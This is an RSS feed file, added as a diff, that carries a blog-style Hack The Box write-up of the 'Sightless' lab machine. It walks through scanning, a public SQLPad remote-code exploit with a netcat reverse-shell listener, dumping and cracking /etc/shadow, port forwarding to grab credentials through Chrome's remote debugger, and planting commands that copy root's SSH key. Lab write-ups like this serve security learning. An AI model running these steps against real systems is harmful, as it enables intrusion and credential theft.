@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Sightless]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>Sightless</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sun, 29 Dec 2024 12:42:33 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sun, 29 Dec 2024 12:42:32 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Sightless]]></title><description><![CDATA[ 
+ <br><img alt="Pasted image 20241229181151.png" src="pasted-image-20241229181151.png"><br><a rel="noopener nofollow" class="external-link" href="https://app.hackthebox.com/machines/Sightless" target="_blank">https://app.hackthebox.com/machines/Sightless</a><br>IP Address: 10.10.11.32<br>
+OS: Linux<br>
+Difficulty: Easy<br><br><br>sudo nmap -sV -sC 10.10.11.32 -T5 -vv -oA Nmap/Sightless.nmap
+<br>Output:<br>PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
+|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://sightless.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.94SVN%I=7%D=12/29%Time=6770ECF2%P=x86_64-pc-linux-gnu%r(
+SF:GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
+SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
+SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
+SF:x20being\x20more\x20creative\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<br>Ports Open:<br>
+<br>21
+<br>22
+<br>80
+<br>Added the Ip address to the /etc/hosts file<br>10.10.11.32 sightless.htb
+<br><br>Looking around the website, we found a link to sqlpad from the source code.<br>mech-dump --links --absolute --agent-alias='Linux Mozilla' http://sightless.htb/
+<br><img alt="Pasted image 20241229123509.png" src="pasted-image-20241229123509.png"><br><img alt="Pasted image 20241229123553.png" src="pasted-image-20241229123553.png"><br>Adding this URL to the /etc/hosts file.<br>10.10.11.32 sightless.htb sqlpad.sightless.htb
+<br>Now, browsing to the URL in the web browser, we see that we have got a clear access to the web page.<br><img alt="Pasted image 20241229123757.png" src="pasted-image-20241229123757.png"><br>Now, let's search for the exploit of this Application. We do find some vulnerabilities and exploits related to this application.<br><img alt="Pasted image 20241229124432.png" src="pasted-image-20241229124432.png"><br><br><br>Let's use this <a data-tooltip-position="top" aria-label="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944" rel="noopener nofollow" class="external-link" href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944" target="_blank">GitHub repository</a>'s code for our exploitation.<br><img alt="Pasted image 20241229124808.png" src="pasted-image-20241229124808.png"><br>Clone the repository<br>git clone https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944.git &amp;&amp; cd sqlpad-rce-exploit-CVE-2022-0944 &amp;&amp; ls
+<br>Now, following the exploit code, let's set up a listener at port 4444 on our local computer.<br>nc -lvnp 4444
+<br><img alt="Pasted image 20241229125022.png" src="pasted-image-20241229125022.png"><br>Now, run the exploit in a new terminal.<br>python3 exploit.py http://sqlpad.sightless.htb &lt;--Attacker's IP Address--&gt; 4444
+<br><img alt="Pasted image 20241229125505.png" src="pasted-image-20241229125505.png"><br>We get a root Shell!!!! That is SUS!!!!!!!<br>Analyzing further we get to know that this service was running on a docker container.<br><img alt="Pasted image 20241229125830.png" src="pasted-image-20241229125830.png"><br>Now, the system has two users present in it.<br>
+<br>node
+<br>michael
+<br><img alt="Pasted image 20241229130221.png" src="pasted-image-20241229130221.png"><br>Let's print out the /etc/passwd and /etc/shadow file and then try to crack the user's password.<br>cat /etc/passwd
+<br><img alt="Pasted image 20241229130301.png" src="pasted-image-20241229130301.png"><br>cat /etc/shadow
+<br><img alt="Pasted image 20241229130345.png" src="pasted-image-20241229130345.png"><br>Now, let's copy the contents of both the files on to our local system in a different terminal and then save the as files passwd and shadow<br><img alt="Pasted image 20241229131203.png" src="pasted-image-20241229131203.png"><br>Now, let's create file crack for cracking the hash of this user using John the Ripper and the rockyou.txt file.<br>unshadow passwd shadow &gt;&gt; crack
+<br><img alt="Pasted image 20241229131319.png" src="pasted-image-20241229131319.png"><br>Now, using the tool John the ripper, let's crack the password.<br>john crack --wordlist=&lt;--Location to the file--&gt;/rockyou.txt
+<br><img alt="Pasted image 20241229131847.png" src="pasted-image-20241229131847.png"><br>We got the password of the root as well as the michael user!!!<br><br>Now, let's try login into the michael user from shh.<br>ssh michael@10.10.11.32
+<br><img alt="Pasted image 20241229132115.png" src="pasted-image-20241229132115.png"><br>WOW!!!!!!! We logged in into the server!!! And we get the flag.<br><img alt="Pasted image 20241229132151.png" src="pasted-image-20241229132151.png"><br>....... after a long search..... and looking through maybe other player's tools (the linpeas.sh), and going through the output of the tool.... I found a service running on port 8080<br><img alt="Pasted image 20241229163249.png" src="pasted-image-20241229163249.png"><br>Now to access that, I port forwarded my system's ports to the server's port.<br>using my other terminal window, let's port forward the traffic of the port 8080 through our computer.<br>ssh michael@10.10.11.32 -L 127.0.0.1:8080:127.0.0.1:8080
+<br><img alt="Pasted image 20241229150105.png" src="pasted-image-20241229150105.png"><br>And now, in our browser, we get the Web Page!!! Sadly.... we don't know any of the username and passwords<br><img alt="Pasted image 20241229152710.png" src="pasted-image-20241229152710.png"><br>Also from the tool's output, we see some of attack vectors for the user john .<br><img alt="Pasted image 20241229164205.png" src="pasted-image-20241229164205.png"><br><img alt="Pasted image 20241229152541.png" src="pasted-image-20241229152541.png"><br>According to the Blog <a data-tooltip-position="top" aria-label="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/" rel="noopener nofollow" class="external-link" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/" target="_blank">here</a> , thought of looking at the other open ports that is only internally accessible and found so many ports to be open.<br>netstat -nlpt
+<br><img alt="Pasted image 20241229145741.png" src="pasted-image-20241229145741.png"><br>Now, According to the blog, we need to inspect the network log of the device.<br>So, now, just port forward the ports again and configured the destinations in the Chrome debugger until a device appeaser.<br>ssh michael@10.10.11.32 -L &lt;--Port--&gt;:127.0.0.1:&lt;--Port--&gt;
+<br>Since, we don't know which port is specified or is being used, I entered all the ports one by one and then tried to get the connection.<br><img alt="Pasted image 20241229164650.png" src="pasted-image-20241229164650.png"><br><img alt="Pasted image 20241229164708.png" src="pasted-image-20241229164708.png"><br><img alt="Pasted image 20241229164749.png" src="pasted-image-20241229164749.png"><br>Now, Click on Inspect and it will open a window where under the index.php file, you can capture the username and the password of the user.<br><img alt="Pasted image 20241229164926.png" src="pasted-image-20241229164926.png"><br>And now, using the credentials that we got!!! We are loggedIn!!!!<br><img alt="Pasted image 20241229165201.png" src="pasted-image-20241229165201.png"><br>Now examine under PHP --&gt; PHP-FPM which contains features of executing system command in the place holder php-fpm restart command<br>So, let's add the following command while editing the System default PHP-FPM<br>cp /root/.ssh/id_rsa /tmp/id_rsa
+<br>or <br>cp /root/root.txt /tmp/root.txt
+<br><img alt="Pasted image 20241229173621.png" src="pasted-image-20241229173621.png"><br>Then click on save at the bottom of the page.<br>Now, go to, System --&gt; Setting --&gt; PHP-FPM  Here, disable and then enable to execute the commands.<br><img alt="Pasted image 20241229171146.png" src="pasted-image-20241229171146.png"><br>Disabling:<br>
+<img alt="Pasted image 20241229171316.png" src="pasted-image-20241229171316.png"><br>Enabling:<br>
+<img alt="Pasted image 20241229171337.png" src="pasted-image-20241229171337.png"><br>And now, if you go the /tmp directory, you will see the id_rsa file.<br><img alt="Pasted image 20241229172028.png" src="pasted-image-20241229172028.png"><br>Now, using this using the same page, give permission to read the files.<br>chmod 777 /tmp/root.txt
+<br><img alt="Pasted image 20241229174158.png" src="pasted-image-20241229174158.png"><br>And then you will get the flag.....<br><img alt="Pasted image 20241229174243.png" src="pasted-image-20241229174243.png"><br>Link: <a rel="noopener nofollow" class="external-link" href="https://www.hackthebox.com/achievement/machine/556269/624" target="_blank">https://www.hackthebox.com/achievement/machine/556269/624</a><br>]]></description><link>sightless.html</link><guid isPermaLink="false">Sightless.md</guid><pubDate>Sun, 29 Dec 2024 12:42:06 GMT</pubDate><enclosure url="pasted-image-20241229181151.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;pasted-image-20241229181151.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
